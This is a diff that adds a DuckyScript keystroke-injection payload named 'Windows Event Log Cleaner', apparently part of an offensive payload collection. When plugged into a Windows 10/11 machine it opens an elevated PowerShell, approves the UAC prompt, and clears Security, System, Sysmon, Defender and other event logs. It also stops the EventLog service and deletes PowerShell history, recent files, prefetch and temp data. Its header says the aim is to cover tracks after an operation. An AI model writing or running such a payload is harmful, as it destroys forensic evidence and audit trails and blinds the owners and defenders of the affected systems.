@@ -1,0 +1,62 @@
+REM ==========================================
+REM Title: Windows Event Log Cleaner
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Clears all major Windows event
+REM   logs (Security, System, Application,
+REM   PowerShell, Sysmon) to remove forensic
+REM   artifacts and cover tracks after an
+REM   operation. Also disables logging services.
+REM Category: Defense Evasion / Anti-Forensics
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass'"
+ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+REM Clear all major event logs
+STRING $logs = @('Security','System','Application','Setup','Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-Sysmon/Operational','Microsoft-Windows-TaskScheduler/Operational','Microsoft-Windows-TerminalServices-LocalSessionManager/Operational','Microsoft-Windows-Windows Defender/Operational','Windows PowerShell')
+ENTER
+DELAY 400
+STRING foreach ($log in $logs) { try { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($log) } catch {} }
+ENTER
+DELAY 500
+REM Also use wevtutil for thorough cleanup
+STRING Get-WinEvent -ListLog * -Force 2>$null | ForEach-Object { try { wevtutil cl $_.LogName 2>$null } catch {} }
+ENTER
+DELAY 1000
+REM Disable Windows Event Log service temporarily
+STRING Stop-Service -Name EventLog -Force 2>$null
+ENTER
+DELAY 400
+REM Clear PowerShell history
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+ENTER
+DELAY 400
+REM Clear recent files and jump lists
+STRING Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse 2>$null
+ENTER
+DELAY 400
+REM Clear prefetch data
+STRING Remove-Item "C:\Windows\Prefetch\*" -Force 2>$null
+ENTER
+DELAY 400
+REM Clear temp files
+STRING Remove-Item "$env:TEMP\*" -Force -Recurse 2>$null
+ENTER
+DELAY 400
+REM Restart Event Log service
+STRING Start-Service -Name EventLog
+ENTER
+DELAY 400
+REM Verify logs are cleared
+STRING Write-Host "Logs cleared:"; Get-WinEvent -ListLog Security,System,Application -Force | Select LogName,RecordCount
+ENTER
+DELAY 500
+STRING Clear-Host; exit
+ENTER
+DELAY 300
+ALT F4
